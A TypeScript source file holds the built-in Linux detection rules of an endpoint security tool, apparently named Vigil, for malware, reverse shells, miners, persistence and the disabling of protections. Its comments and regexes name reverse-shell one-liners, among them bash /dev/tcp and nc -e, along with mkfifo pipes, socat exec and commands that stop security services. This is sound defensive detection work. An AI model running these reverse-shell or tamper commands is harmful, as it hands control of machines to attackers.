import type { DetectionRuleInput } from '../types.js';
import { PIPE_TO_SHELL_RE, SHELLS, UNTRUSTED_SIGNING } from './macos-core.js';

/**
 * Built-in Linux rules.
 *
 * Linux has no code signing, so "untrusted" here means not installed by the
 * package manager (signing `unsigned`; see @vigil/sensors linux/packages.ts).
 * osquery reports launches, connections, listeners and startup files, but
 * not file reads, so the macOS rules about reading passwords and cookies
 * have no Linux version yet.
 *
 * Rules that mean the same thing on both systems keep the macOS rule's id,
 * so a user's choices about them carry over. As on macOS, only known-bad
 * lists and the user's own blocks start in `block`; behaviour rules alert.
 */

const PACK_DATE = Date.UTC(2026, 9, 5);

type PackRule = Omit<DetectionRuleInput, 'version' | 'origin' | 'createdAt' | 'updatedAt'> & {
  version?: number;
};

function rule(r: PackRule): DetectionRuleInput {
  return {
    version: 1,
    origin: 'builtin',
    createdAt: PACK_DATE,
    updatedAt: PACK_DATE,
    ...r,
    tags: [...(r.tags ?? []), 'linux'],
  };
}

const SUSPEND = {
  kind: 'process.suspend',
  pid: '{{process.pid}}',
  startTime: '{{process.startTime}}',
  path: '{{process.path}}',
} as const;
const KILL = {
  kind: 'process.kill',
  pid: '{{process.pid}}',
  startTime: '{{process.startTime}}',
  path: '{{process.path}}',
} as const;
/** On Linux the helper turns this into a fapolicyd rule by hash. */
const BLOCK_BINARY = {
  kind: 'santa.rule.set',
  ruleType: 'binary',
  identifier: '{{process.sha256}}',
  policy: 'block',
} as const;

/** Folders anyone can write to; programs rarely run from there. */
const SHARED_TEMP_GLOBS = ['/tmp/**', '/var/tmp/**'];
/** In memory, never on disk: a classic place for droppers to hide. */
const MEMORY_GLOBS = ['/dev/shm/**', '/run/shm/**', '/memfd:*'];
const DOWNLOAD_GLOBS = ['~/Downloads/**'];

/** Services that keep the machine watched or locked down. */
const SECURITY_SERVICES = [
  'fapolicyd',
  'osqueryd',
  'vigil-helper',
  'apparmor',
  'auditd',
  'firewalld',
  'ufw',
  'nftables',
];

export const linuxCoreRules: DetectionRuleInput[] = [
  // ------------------------------------------------------------------ block
  rule({
    id: 'known-bad-hash',
    name: 'Known malware started',
    description: "The program's SHA-256 is on a known-malware list.",
    mode: 'block',
    severity: 'critical',
    fidelity: 'high',
    eventKinds: ['process.exec'],
    condition: { inList: { list: 'known_bad_sha256', field: 'process.sha256' } },
    response: [KILL, BLOCK_BINARY],
    reasons: [
      '{{process.name}} matches a known-malware fingerprint.',
      'It was started from {{process.path}}.',
    ],
    santa: { ruleType: 'binary', from: 'process.sha256' },
    tags: ['attack.execution'],
  }),
  rule({
    id: 'user-blocked-hash',
    name: 'Program you blocked started again',
    description: 'You confirmed this exact program as malicious before.',
    mode: 'block',
    severity: 'critical',
    fidelity: 'high',
    eventKinds: ['process.exec'],
    condition: { inList: { list: 'user_blocked_sha256', field: 'process.sha256' } },
    response: [KILL, BLOCK_BINARY],
    reasons: ['You blocked {{process.name}} before, and it tried to run again.'],
    santa: { ruleType: 'binary', from: 'process.sha256' },
  }),
  rule({
    id: 'known-bad-destination',
    name: 'Connection to a known-malicious address',
    description:
      'A program connected to an IP address on a threat list (for example a botnet command server). Vigil blocks the address; the program keeps running, so a browser that loaded a bad page is not killed.',
    mode: 'block',
    severity: 'high',
    fidelity: 'high',
    eventKinds: ['network.connection'],
    condition: { inList: { list: 'known_bad_ips', field: 'remoteAddress' } },
    response: [{ kind: 'network.block', address: '{{remoteAddress}}' }],
    reasons: [
      '{{process.name}} connected to {{remoteHost|remoteAddress}}, which is on a threat list.',
      'Vigil blocked the address. The program itself keeps running.',
    ],
    dedupe: { key: ['remoteAddress'], windowSec: 3600 },
    tags: ['attack.command_and_control'],
  }),

  // ------------------------------------------------------------------ alert
  rule({
    id: 'known-bad-domain',
    name: 'Connection to a known-malicious website',
    description:
      'A program connected to a host name on a threat list. Many sites share one address behind a CDN, so Vigil asks before blocking the address.',
    mode: 'alert',
    severity: 'high',
    fidelity: 'medium',
    eventKinds: ['network.connection'],
    condition: { inList: { list: 'known_bad_domains', field: 'remoteHost' } },
    response: [{ kind: 'network.block', address: '{{remoteAddress}}' }],
    reasons: [
      '{{process.name}} connected to {{remoteHost}}, which is on a list of sites spreading malware.',
      'The address {{remoteAddress}} may also serve other sites, so Vigil asks before blocking it.',
    ],
    dedupe: { key: ['remoteHost'], windowSec: 3600 },
    tags: ['attack.command_and_control', 'attack.initial_access'],
  }),
  rule({
    id: 'download-pipe-to-shell',
    name: 'Downloaded script run directly',
    description:
      "A shell ran something straight from curl or wget. Some installers do this, but so do fake 'paste this into your terminal' fixes.",
    mode: 'alert',
    severity: 'medium',
    fidelity: 'medium',
    eventKinds: ['process.exec'],
    condition: {
      all: [
        { field: 'process.name', op: 'in', value: SHELLS },
        {
          any: [
            { field: 'process.commandLine', op: 'regex', value: [PIPE_TO_SHELL_RE] },
            { field: 'process.commandLine', op: 'contains', value: ['$(curl', '$(wget'] },
          ],
        },
        // Claude Code's exact local-service reads (see rules/quiet-lines.ts).
        { not: { field: 'process.quietDownloadLine', op: 'eq', value: true } },
      ],
    },
    response: [SUSPEND],
    reasons: [
      'A command downloaded code from the internet and ran it right away: {{process.commandLine}}',
      'If you just pasted this from a site you trust (for example an installer), you can allow it.',
    ],
    tags: ['attack.execution', 'attack.t1059.004'],
  }),
  rule({
    id: 'base64-pipe-to-shell',
    name: 'Hidden script decoded and run',
    description:
      'A command decoded base64 text and piped it into a shell, a common way to hide what it does.',
    mode: 'alert',
    severity: 'high',
    fidelity: 'medium',
    eventKinds: ['process.exec'],
    condition: {
      field: 'process.commandLine',
      op: 'regex',
      value: ['base64\\s+(-d|--decode)[^|]*\\|\\s*(sudo\\s+)?(ba|z|da)?sh\\b'],
    },
    response: [SUSPEND],
    reasons: ['A command unpacked hidden text and ran it as a script.'],
    tags: ['attack.defense_evasion', 'attack.t1140'],
  }),
  rule({
    id: 'linux-reverse-shell',
    name: 'Shell handed to another computer',
    description:
      "A command connected a shell's input and output to a network address, which gives whoever is on the other end control of this computer.",
    mode: 'alert',
    severity: 'critical',
    fidelity: 'high',
    eventKinds: ['process.exec'],
    condition: {
      field: 'process.commandLine',
      op: 'regex',
      nocase: true,
      value: [
        // bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
        '/dev/(tcp|udp)/[^/\\s]+/\\d+',
        // nc -e /bin/sh, ncat --exec, busybox nc -e
        '\\b(nc|ncat|netcat)\\b[^|;&]*\\s(-e|-c|--exec|--sh-exec)\\s',
        // socat TCP:host:port EXEC:/bin/sh
        '\\bsocat\\b[^|;&]*\\b(exec|system):',
        // python -c '…socket…subprocess…' / pty.spawn
        '\\bpython[0-9.]*\\s+-c\\s.*\\bsocket\\b.*\\b(subprocess|pty\\.spawn|os\\.dup2)\\b',
        // mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc host port > /tmp/f
        '\\bmkfifo\\b[^;]*;.*\\|\\s*(ba|da|z)?sh\\s+-i\\b.*\\|\\s*(nc|ncat|netcat)\\b',
      ],
    },
    response: [KILL],
    reasons: [
      'A command gave a shell to a remote computer: {{process.commandLine}}',
      "It was started by {{process.parentName|'another program'}}.",
    ],
    tags: ['attack.execution', 'attack.command_and_control', 'attack.t1059.004'],
  }),
  rule({
    id: 'linux-exec-from-memory',
    name: 'Program run from memory',
    description:
      'A program ran from /dev/shm or from an anonymous in-memory file. Normal software runs from disk; malware does this so nothing is left behind.',
    mode: 'alert',
    severity: 'high',
    fidelity: 'high',
    eventKinds: ['process.exec'],
    condition: { field: 'process.path', op: 'glob', value: MEMORY_GLOBS },
    response: [KILL],
    reasons: ['{{process.name}} ran from {{process.path}}, which only exists in memory.'],
    tags: ['attack.defense_evasion', 'attack.t1620'],
  }),
  rule({
    id: 'exec-from-shared-temp',
    name: 'New program started from a temporary folder',
    description:
      'A program the package manager did not install ran from /tmp or /var/tmp for the first time.',
    mode: 'alert',
    severity: 'medium',
    fidelity: 'medium',
    eventKinds: ['process.exec'],
    condition: {
      all: [
        { field: 'process.path', op: 'glob', value: SHARED_TEMP_GLOBS },
        { field: 'process.signing', op: 'in', value: UNTRUSTED_SIGNING },
        { firstSeen: { key: ['process.path'] } },
      ],
    },
    response: [SUSPEND],
    reasons: [
      '{{process.name}} ran from {{process.path}}, a temporary folder anyone can write to, and no package installed it.',
    ],
    santa: { ruleType: 'binary', from: 'process.sha256' },
    tags: ['attack.execution'],
  }),
  rule({
    id: 'linux-download-exec',
    name: 'Downloaded program opened',
    description:
      'A program in Downloads that the package manager did not install ran for the first time.',
    mode: 'alert',
    severity: 'medium',
    fidelity: 'medium',
    eventKinds: ['process.exec'],
    condition: {
      all: [
        { field: 'process.path', op: 'glob', value: DOWNLOAD_GLOBS },
        { field: 'process.signing', op: 'in', value: UNTRUSTED_SIGNING },
        { firstSeen: { key: ['process.path'] } },
      ],
    },
    response: [SUSPEND, { kind: 'file.quarantine', path: '{{process.path}}' }],
    reasons: [
      '{{process.name}} was started from your Downloads folder. No package installed it, so Linux has nothing to vouch for it.',
    ],
    santa: { ruleType: 'binary', from: 'process.sha256' },
    tags: ['attack.execution', 'attack.t1204.002'],
  }),
  rule({
    id: 'linux-crypto-miner',
    name: 'Crypto miner started',
    description:
      'A well-known cryptocurrency miner, or a program pointed at a mining pool, started. Miners are the most common payload on compromised Linux machines.',
    mode: 'alert',
    severity: 'high',
    fidelity: 'high',
    eventKinds: ['process.exec'],
    condition: {
      any: [
        {
          field: 'process.name',
          op: 'in',
          value: ['xmrig', 'xmr-stak', 'minerd', 'cpuminer', 'kdevtmpfsi', 'kinsing'],
          nocase: true,
        },
        {
          field: 'process.commandLine',
          op: 'contains',
          value: ['stratum+tcp://', 'stratum+ssl://'],
        },
      ],
    },
    response: [KILL],
    reasons: ['{{process.name}} looks like a crypto miner: {{process.commandLine}}'],
    santa: { ruleType: 'binary', from: 'process.sha256' },
    tags: ['attack.impact', 'attack.t1496'],
  }),
  rule({
    id: 'linux-security-tool-stopped',
    name: 'Security protection switched off',
    description:
      'A command stopped or disabled a service that protects this computer (Vigil, osquery, fapolicyd, the firewall, AppArmor or audit), or flushed the firewall rules.',
    mode: 'alert',
    severity: 'high',
    fidelity: 'high',
    eventKinds: ['process.exec'],
    condition: {
      any: [
        {
          all: [
            { field: 'process.name', op: 'in', value: ['systemctl', 'service'] },
            { field: 'process.args', op: 'in', value: ['stop', 'disable', 'mask', 'kill'] },
            {
              field: 'process.args',
              op: 'regex',
              value: [`^(${SECURITY_SERVICES.join('|')})(\\.service)?$`],
            },
          ],
        },
        {
          all: [
            { field: 'process.name', op: 'eq', value: 'nft' },
            {
              field: 'process.commandLine',
              op: 'regex',
              value: ['\\bflush\\s+ruleset\\b', '\\bdelete\\s+table\\s+inet\\s+vigil\\b'],
            },
          ],
        },
        {
          all: [
            { field: 'process.name', op: 'in', value: ['ufw', 'setenforce', 'aa-teardown'] },
            {
              any: [
                { field: 'process.name', op: 'eq', value: 'aa-teardown' },
                { field: 'process.args', op: 'in', value: ['disable', '0', 'Permissive'] },
              ],
            },
          ],
        },
      ],
    },
    response: [SUSPEND],
    reasons: [
      "{{process.parentName|'A command'}} switched off a protection: {{process.commandLine}}",
    ],
    tags: ['attack.defense_evasion', 'attack.t1562.001'],
  }),
  rule({
    id: 'linux-history-cleared',
    name: 'Shell history wiped',
    description:
      'A command cleared or switched off the shell history, which attackers do to hide what they ran.',
    mode: 'alert',
    severity: 'medium',
    fidelity: 'medium',
    eventKinds: ['process.exec'],
    condition: {
      field: 'process.commandLine',
      op: 'regex',
      value: [
        '\\bhistory\\s+-c\\b',
        '\\bunset\\s+HISTFILE\\b',
        'HISTFILE=/dev/null',
        '\\b(rm|shred|truncate)\\b[^|;&]*\\.(bash|zsh)_history\\b',
        '>\\s*~?/?[^\\s]*\\.(bash|zsh)_history\\b',
      ],
    },
    reasons: ['Something erased the record of commands run in a shell: {{process.commandLine}}'],
    tags: ['attack.defense_evasion', 'attack.t1070.003'],
  }),
  rule({
    id: 'linux-persistence-temp-path',
    name: 'Startup item in a temporary folder',
    description: 'A systemd unit or autostart entry was added under a temporary or memory folder.',
    mode: 'alert',
    severity: 'high',
    fidelity: 'high',
    eventKinds: ['persistence'],
    condition: {
      all: [
        { field: 'change', op: 'in', value: ['added', 'modified'] },
        { field: 'path', op: 'glob', value: [...SHARED_TEMP_GLOBS, ...MEMORY_GLOBS] },
      ],
    },
    reasons: ['{{path}} was set to start automatically from a temporary folder.'],
    tags: ['attack.persistence'],
  }),
  rule({
    id: 'persistence-first-seen',
    name: 'New startup item',
    description:
      'A new systemd service or autostart entry was added outside the package folders, so it will start on its own.',
    mode: 'alert',
    severity: 'low',
    fidelity: 'low',
    eventKinds: ['persistence'],
    condition: {
      all: [
        { field: 'change', op: 'eq', value: 'added' },
        { field: 'mechanism', op: 'in', value: ['systemd_unit', 'autostart'] },
        { firstSeen: { key: ['path'] } },
      ],
    },
    response: [{ kind: 'persistence.disable', path: '{{path}}' }],
    reasons: ['{{pathName}} was added and will start automatically.'],
    tags: ['attack.persistence', 'attack.t1543.002'],
  }),
  rule({
    id: 'linux-cron-added',
    name: 'New scheduled job',
    description: 'A cron job was added. Malware uses cron to come back after it is removed.',
    mode: 'alert',
    severity: 'medium',
    fidelity: 'low',
    eventKinds: ['persistence'],
    condition: {
      all: [
        { field: 'change', op: 'eq', value: 'added' },
        { field: 'mechanism', op: 'eq', value: 'cron' },
        { firstSeen: { key: ['path', 'program'] } },
      ],
    },
    reasons: ["A scheduled job was added in {{path}}: {{program|'a command'}}"],
    tags: ['attack.persistence', 'attack.t1053.003'],
  }),
  rule({
    id: 'linux-shell-profile-changed',
    name: 'Shell startup file changed',
    description:
      'A file every new terminal runs (.bashrc, .profile, .zshrc or /etc/profile.d) changed. You may have edited it yourself; malware adds lines here to run again.',
    mode: 'alert',
    severity: 'low',
    fidelity: 'low',
    eventKinds: ['persistence'],
    condition: {
      all: [
        { field: 'mechanism', op: 'eq', value: 'shell_profile' },
        { field: 'change', op: 'eq', value: 'modified' },
      ],
    },
    reasons: ['{{path}} changed. Every new terminal runs it.'],
    dedupe: { key: ['path'], windowSec: 3600 },
    tags: ['attack.persistence', 'attack.t1546.004'],
  }),
  rule({
    id: 'new-network-listener',
    name: 'New app accepting connections from the network',
    description:
      'A program the package manager did not install started listening on all network interfaces.',
    mode: 'alert',
    severity: 'low',
    fidelity: 'low',
    eventKinds: ['network.listen'],
    condition: {
      all: [
        { field: 'localAddress', op: 'in', value: ['0.0.0.0', '::', '*'] },
        { field: 'process.signing', op: 'neq', value: 'package' },
        { firstSeen: { key: ['process.path', 'localPort'] } },
      ],
    },
    reasons: [
      '{{process.name}} is accepting connections from other devices on port {{localPort}}.',
    ],
    tags: ['attack.command_and_control'],
  }),
  rule({
    id: 'browser-extension-broad-access',
    name: 'New browser extension that can read every site',
    description: 'An extension was installed with access to all sites, cookies or native apps.',
    mode: 'alert',
    severity: 'medium',
    fidelity: 'medium',
    eventKinds: ['browser.extension'],
    condition: {
      all: [
        { field: 'change', op: 'eq', value: 'added' },
        {
          field: 'permissions',
          op: 'in',
          value: [
            '<all_urls>',
            'cookies',
            'debugger',
            'nativeMessaging',
            '*://*/*',
            'http://*/*',
            'https://*/*',
          ],
        },
        { firstSeen: { key: ['browser', 'extensionId'] } },
      ],
    },
    reasons: ['{{name}} was added to {{browser}} and can read or change what you do on websites.'],
    tags: ['attack.persistence', 'attack.t1176'],
  }),

  // ----------------------------------------------------------------- shadow
  rule({
    id: 'download-then-run',
    name: 'Download and code runner in one command',
    description:
      "A shell command both downloads something and has a way to run code, such as a shell, an interpreter, eval or a pipe into a program that is not a plain reader. It doesn't check that the download is what runs, so it only records, to measure how often it would fire.",
    mode: 'shadow',
    severity: 'medium',
    fidelity: 'low',
    eventKinds: ['process.exec'],
    condition: {
      all: [
        { field: 'process.name', op: 'in', value: SHELLS },
        { field: 'process.downloadThenRun', op: 'eq', value: true },
        // Claude Code's exact local-service reads (see rules/quiet-lines.ts).
        { not: { field: 'process.quietDownloadLine', op: 'eq', value: true } },
      ],
    },
    reasons: [
      'A command downloads something and could run code in the same line: {{process.commandLine}}',
    ],
    tags: ['attack.execution', 'attack.t1059.004'],
  }),
  rule({
    id: 'unsigned-first-network',
    name: "Untrusted program's first network connection",
    description:
      'A program the package manager did not install connected out for the first time. Common for developer tools, so it only records and feeds the weekly review.',
    mode: 'shadow',
    severity: 'low',
    fidelity: 'low',
    eventKinds: ['network.connection'],
    condition: {
      all: [
        { field: 'direction', op: 'eq', value: 'outbound' },
        { field: 'process.signing', op: 'in', value: UNTRUSTED_SIGNING },
        { firstSeen: { key: ['process.path'] } },
      ],
    },
    reasons: [
      '{{process.name}} ({{process.path}}) connected to {{remoteAddress}} for the first time.',
    ],
    tags: ['attack.command_and_control'],
  }),
];
